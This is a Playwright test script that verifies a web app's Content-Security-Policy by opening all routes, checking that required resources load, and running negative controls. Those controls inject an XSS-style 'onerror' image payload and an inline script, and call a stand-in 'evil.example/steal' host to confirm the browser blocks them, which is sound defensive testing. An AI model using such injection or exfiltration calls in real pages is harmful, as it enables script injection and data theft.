// Step Sec2 (bos111, M5): the Content-Security-Policy meta of web/index.html breaks nothing. The full app in Chromium with the usual mocks (stub supabase); EVERY route of the IA registry is opened and every
// securitypolicyviolation / console CSP error is collected. Negative controls prove the policy is really enforced (inline script, foreign connect, foreign image).
// Run: node tests/web/sec2_csp_test.js [<abs tests/web dir>]      (serves web/ of this checkout, or $WEB_DIR)
const _P = require('./_paths');
const { chromium } = require('/opt/node22/lib/node_modules/playwright');
const fs = require('fs'), path = require('path'), http = require('http'), crypto = require('crypto');
const SP = process.argv[2] || _P.TESTS_DIR, ROOT = _P.WEB_DIR, PORT = _P.freePort();
let pass = 0, bad = 0; const ok = (c, m) => { if (!c) { bad++; console.log('FAIL:', m); } else pass++; };
const html = fs.readFileSync(path.join(ROOT, 'index.html'), 'utf8');
// 1. static: the meta is there, comes before every script, and the hash is the hash of the one inline script
const m = html.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)"/);
ok(!!m, 'index.html has the CSP meta'); const pol = m ? m[1] : '';
ok(html.indexOf('Content-Security-Policy') < html.indexOf('<script'), 'the CSP meta comes before the first script');
const inl = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map((x) => x[1]);
ok(inl.length === 1, 'exactly one inline script (the theme script): ' + inl.length);
inl.forEach((s) => ok(pol.includes("'sha256-" + crypto.createHash('sha256').update(s, 'utf8').digest('base64') + "'"), 'the policy carries the sha256 of the inline script'));
ok(/script-src 'self'[^;]*(?!'unsafe-inline')/.test(pol) && !/script-src[^;]*'unsafe-inline'/.test(pol) && !/script-src[^;]*'unsafe-eval'/.test(pol), 'script-src has no unsafe-inline / unsafe-eval');
ok(/object-src 'none'/.test(pol) && /base-uri 'self'/.test(pol) && /connect-src 'self' https:\/\/\*\.supabase\.co wss:\/\/\*\.supabase\.co/.test(pol), 'object-src none, base-uri self, connect-src supabase');
const extScripts = [...html.matchAll(/<script[^>]*src="([^"]+)"/g)].map((x) => x[1]); ok(extScripts.every((s) => !/^https?:/.test(s)), 'every <script src> is a same-origin file');
const data = (() => { const src = fs.readFileSync(SP + '/smoke.js', 'utf8'); return new Function('fs', src.slice(src.indexOf('const csv'), src.indexOf('const srv')).replace(/const fs = require.*\n/, '') + ';return data;')(fs); })();
data.tables.option_lists = data.tables.option_lists || []; data.tables.location_settings = [];
const srv = http.createServer((q, r) => { const f = path.join(ROOT, q.url.split('?')[0] === '/' ? 'index.html' : q.url.split('?')[0]); fs.readFile(f, (e, b) => { if (e) { r.writeHead(404); return r.end(); } const ext = path.extname(f);
  r.writeHead(200, { 'content-type': { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.svg': 'image/svg+xml', '.webp': 'image/webp', '.json': 'application/json' }[ext] || 'application/octet-stream' }); r.end(b); }); }).listen(PORT);
(async () => {
  const br = await chromium.launch({ executablePath: '/opt/pw-browsers/chromium-1194/chrome-linux/chrome' });
  const ctx = await br.newContext({ viewport: { width: 390, height: 800 } }); const p = await ctx.newPage();
  const errs = [], cons = []; p.on('pageerror', (e) => errs.push(e.message)); p.on('console', (mm) => { if (/Content Security Policy|Refused to/i.test(mm.text())) cons.push(mm.text().slice(0, 200)); });
  await p.route('**/vendor/supabase.js', (r) => r.fulfill({ contentType: 'text/javascript', body: fs.readFileSync(SP + '/stub.js', 'utf8') }));
  await p.route('https://fonts.googleapis.com/**', (r) => r.fulfill({ contentType: 'text/css', body: '' }));
  await p.route('https://fonts.gstatic.com/**', (r) => r.fulfill({ contentType: 'font/woff2', body: '' }));
  await p.route('https://cdn.jsdelivr.net/**', (r) => r.fulfill({ contentType: 'text/javascript', body: 'window.Tesseract={createWorker:function(){return 1}};' }));
  await p.route('https://x1.supabase.co/**', (r) => r.fulfill({ contentType: 'image/png', body: Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64') }));
  await p.route('https://evil.example/**', (r) => r.fulfill({ contentType: 'image/png', body: Buffer.from('x') }));
  await p.addInitScript(`window.__DATA=${JSON.stringify(data)};window.__CSPV=[];document.addEventListener('securitypolicyviolation',function(e){window.__CSPV.push(e.violatedDirective+' '+e.blockedURI);});try{localStorage.setItem('bos_lang','en')}catch(e){}`);
  await p.goto('http://localhost:' + PORT + '/#/home'); await p.waitForTimeout(1500);
  ok(await p.evaluate(() => !!(window.BOS_THEME && document.documentElement.getAttribute('data-theme'))), 'the hashed inline theme script ran (BOS_THEME + data-theme set)');
  const routes = await p.evaluate(() => [...new Set((window.BOS.IA || []).map((x) => x.route).concat(['home', 'items', 'staff', 'matrix', 'rules', 'settings', 'logs', 'backup', 'itemreq']))]);
  ok(routes.length > 60, 'routes to open: ' + routes.length);
  for (const rt of routes) { await p.evaluate((r) => { location.hash = '#/' + r; }, rt); await p.waitForTimeout(160); }
  await p.evaluate(() => { location.hash = '#/home'; }); await p.waitForTimeout(300);
  const v1 = await p.evaluate(() => window.__CSPV.slice());
  ok(v1.length === 0, 'no CSP violation while opening ' + routes.length + ' routes: ' + v1.slice(0, 5).join(' | '));
  // three screens read a null from the bare stub (identical without the CSP, checked on the old index.html); any OTHER page error fails
  const KNOWN = [/reading 'start'\)/, /reading 'unknown_cost_rev'\)/, /reading 'mode'\)/];
  ok(errs.every((e) => KNOWN.some((k) => k.test(e))) && !errs.some((e) => /security|policy|refused|blocked/i.test(e)), 'no page error beyond the 3 stub-null ones: ' + errs.filter((e) => !KNOWN.some((k) => k.test(e))).slice(0, 3).join(' | '));
  // 2. what the app does at run time that the policy must allow
  const rt = await p.evaluate(async () => {
    const o = {};
    const f = document.createElement('iframe'); f.srcdoc = '<style>b{color:red}</style><b id=x>hi</b>'; document.body.appendChild(f); await new Promise((r) => { f.onload = r; setTimeout(r, 600); });
    o.srcdoc = !!(f.contentDocument && f.contentDocument.getElementById('x')); f.remove();
    try { const w = new Worker(URL.createObjectURL(new Blob(['postMessage(7)']))); o.worker = await new Promise((r) => { w.onmessage = (e) => r(e.data === 7); w.onerror = () => r(false); setTimeout(() => r(false), 800); }); w.terminate(); } catch (e) { o.worker = false; }
    try { o.wasm = await WebAssembly.instantiate(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0])).then(() => true, () => false); } catch (e) { o.wasm = false; }
    o.ocr = await new Promise((r) => { const s = document.createElement('script'); s.src = 'https://cdn.jsdelivr.net/npm/tesseract.js@5.1.1/dist/tesseract.min.js'; s.onload = () => r(!!window.Tesseract); s.onerror = () => r(false); document.head.appendChild(s); setTimeout(() => r(false), 1500); });
    o.imgSupa = await new Promise((r) => { const i = new Image(); i.onload = () => r(true); i.onerror = () => r(false); i.src = 'https://x1.supabase.co/storage/v1/a.png'; setTimeout(() => r(false), 1500); });
    o.imgBlob = await new Promise((r) => { const i = new Image(); i.onload = () => r(true); i.onerror = () => r(false); i.src = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=='; setTimeout(() => r(false), 1500); });
    return o;
  });
  ok(rt.srcdoc, 'a srcdoc print frame (purchase print / templates) renders'); ok(rt.worker, 'a blob: worker starts (OCR)'); ok(rt.wasm, 'WebAssembly compiles (OCR core)');
  ok(rt.ocr, 'the pinned OCR script from cdn.jsdelivr.net loads'); ok(rt.imgSupa, 'an image from *.supabase.co loads (signed item photos)'); ok(rt.imgBlob, 'a data: image loads');
  const v2 = await p.evaluate(() => window.__CSPV.slice()); ok(v2.length === 0, 'no CSP violation for the run-time checks: ' + v2.join(' | '));
  // 3. negative controls: the policy is really enforced
  const neg = await p.evaluate(async () => {
    const o = {}; window.__CSPV.length = 0; window.__PWN = 0;
    const d = document.createElement('div'); d.innerHTML = '<img src=x onerror="window.__PWN=1">'; document.body.appendChild(d);
    const s = document.createElement('script'); s.textContent = 'window.__PWN=2'; document.head.appendChild(s);
    o.fetchFail = await fetch('https://evil.example/steal').then(() => false, () => true);
    o.imgFail = await new Promise((r) => { const i = new Image(); i.onload = () => r(false); i.onerror = () => r(true); i.src = 'https://evil.example/a.png'; setTimeout(() => r(false), 1500); });
    o.extScript = await new Promise((r) => { const q = document.createElement('script'); q.src = 'https://evil.example/x.js'; q.onload = () => r(false); q.onerror = () => r(true); document.head.appendChild(q); setTimeout(() => r(false), 1500); });
    await new Promise((r) => setTimeout(r, 300)); o.pwn = window.__PWN; o.v = window.__CSPV.length; return o;
  });
  ok(neg.pwn === 0, 'inline script / inline handler injected into the page do NOT run (pwn=' + neg.pwn + ')'); ok(neg.fetchFail, 'fetch to a foreign host is blocked'); ok(neg.imgFail, 'image from a foreign host is blocked'); ok(neg.extScript, 'script from a foreign host is blocked');
  ok(neg.v >= 4, 'the browser reported the blocked attempts (' + neg.v + ' violations)');
  console.log('console CSP lines during the positive phases:', cons.filter((c) => !/evil\.example|inline script|inline event/i.test(c)).length);
  console.log('pass', pass, 'assert failures:', bad);
  await br.close(); srv.close(); process.exit(bad ? 1 : 0);
})().catch((e) => { console.log('CRASH', e); process.exit(1); });
